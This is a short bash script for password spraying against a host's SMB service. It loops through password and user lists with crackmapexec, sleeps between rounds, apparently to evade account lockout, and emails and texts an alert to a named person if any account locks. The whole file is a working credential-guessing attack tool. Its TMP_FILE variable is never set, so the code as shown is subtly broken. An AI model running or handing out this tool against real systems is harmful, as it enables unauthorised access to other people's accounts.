#!/bin/bash
 
HOST="$1"
USERS="$2"
PASSWORDS="$3"
SLEEP="$4"
 
EMAIL="ryan.wendel@foobarbbq.com"
TEXT="7205551234@mms.att.net"
 
# 45.5 minutes = 2730 seconds
 
print_help() {
        echo "Usage: $(basename $0) <host/ip> <user file> <password file> <sleep seconds>"
}
  
if [ -z "${HOST}" ]; then
        echo "Error: Provide me a host/ip"
        echo
        print_help
        exit 1
fi
  
if [ -z "$USERS" ]; then
        echo "Error: Provide me with a users file"
        print_help
        exit 2
elif [ ! -f "$USERS" ]; then
        echo "Error: Users file doesn't exist"
        print_help
        exit 3
fi
 
if [ -z "$PASSWORDS" ]; then
        echo "Error: Provide me with a password file"
        print_help
        exit 4
elif [ ! -f "$PASSWORDS" ]; then
        echo "Error: Passwords file doesn't exist"
        print_help
        exit 5
fi
  
if [ -z "${SLEEP}" ]; then
        echo "Error: Provide me with number of seconds to sleep"
        echo
        print_help
        exit 6
fi
  
if [[ ! "$SLEEP" =~ ^[0-9]+$ ]]; then
        echo "Error: Provide me with an integer number of seconds to sleep"
        echo
        print_help
        exit 7
fi
  
> $TMP_FILE
 
COUNT="0"
 
while read PASS; do
 
    while read USER; do
 
        crackmapexec smb $HOST -u $USER -p $PASS | tee -a $TMP_FILE
 
        COUNT=$(grep -c LOCKED $TMP_FILE)
 
        if [[ $COUNT -gt 0 ]]; then
            grep LOCKED $TMP_FILE | mail -s "Account Lockout Issues" $EMAIL
            echo "Account lockout issues. Check your email" | mail -s "Account Lockout Issues" $TEXT
            exit
        fi
 
    done < <(cat $USERS)
 
    echo "Sleeping $SLEEP seconds"
 
    sleep $SLEEP
 
done < <(cat $PASSWORDS)
 
rm -f $TMP_FILE
